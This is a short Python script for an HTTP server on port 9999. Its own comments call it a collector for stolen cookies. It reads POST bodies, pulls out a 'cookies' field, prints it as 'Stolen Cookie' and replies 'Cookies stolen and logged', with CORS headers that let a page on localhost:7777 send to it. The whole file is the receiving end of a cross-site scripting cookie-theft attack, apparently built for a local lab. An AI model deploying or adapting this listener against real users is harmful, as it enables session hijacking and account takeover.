from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class RequestHandler(BaseHTTPRequestHandler):
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "http://localhost:7777")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        # Handle GET requests, log the query parameters
        print("GET request received")
        print(f"Query: {self.path}")
        
        # Send a simple response back to the client
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Access-Control-Allow-Origin", "http://localhost:7777")
        self.end_headers()
        self.wfile.write(b"GET request received")

    def do_POST(self):
        # Handle POST requests, typically to capture stolen cookies
        content_length = int(self.headers['Content-Length'])  # Get the length of the body data
        post_data = self.rfile.read(content_length).decode('utf-8')  # Read and decode the POST data
        
        # Parse and log the data, which might contain stolen cookies
        parsed_data = urllib.parse.parse_qs(post_data)
        if 'cookies' in parsed_data:
            stolen_cookie = parsed_data['cookies'][0]
            print(f"Stolen Cookie: {stolen_cookie}")
        
        # Send a response to the client
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Access-Control-Allow-Origin", "http://localhost:7777")
        self.end_headers()
        self.wfile.write(b"POST request received. Cookies stolen and logged.")
    
    def log_message(self, format, *args):
        # Overriding to suppress default logging (for clean output)
        return

# Set up and start the server on all interfaces (0.0.0.0) and port 9999
server = HTTPServer(('0.0.0.0', 9999), RequestHandler)
print("Server running on port 9999...")
server.serve_forever()